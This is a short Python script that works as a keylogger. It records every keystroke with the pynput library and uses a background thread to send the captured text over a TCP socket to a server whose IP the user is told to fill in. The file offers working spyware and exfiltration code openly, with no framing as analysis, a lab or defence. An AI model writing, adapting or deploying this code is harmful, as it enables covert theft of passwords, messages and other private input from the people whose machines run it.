import socket
import threading
from pynput import keyboard

# Server IP and port (replace with your server's IP)
SERVER_IP = '127.0.0.1'
SERVER_PORT = 9999

# Create a global variable to store the logged keys
log = ""

# Function to capture keystrokes
def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "  # Handle spaces
        elif key == key.enter:
            log += "\n"  # Handle enter key
        else:
            log += f" {str(key)} "  # Handle special keys

# Function to send keystrokes to the server
def send_log_to_server():
    global log
    while True:
        if log:
            try:
                # Connect to the server
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client_socket.connect((SERVER_IP, SERVER_PORT))

                # Send the log data to the server
                client_socket.sendall(log.encode())
                log = ""  # Clear log after sending

                # Close the connection
                client_socket.close()
            except Exception as e:
                print(f"Failed to send data: {e}")

# Function to start the keylogger and sender thread
def start_keylogger():
    # Start a thread to send logs to the server
    sender_thread = threading.Thread(target=send_log_to_server)
    sender_thread.daemon = True
    sender_thread.start()

    # Start listening for keyboard events
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
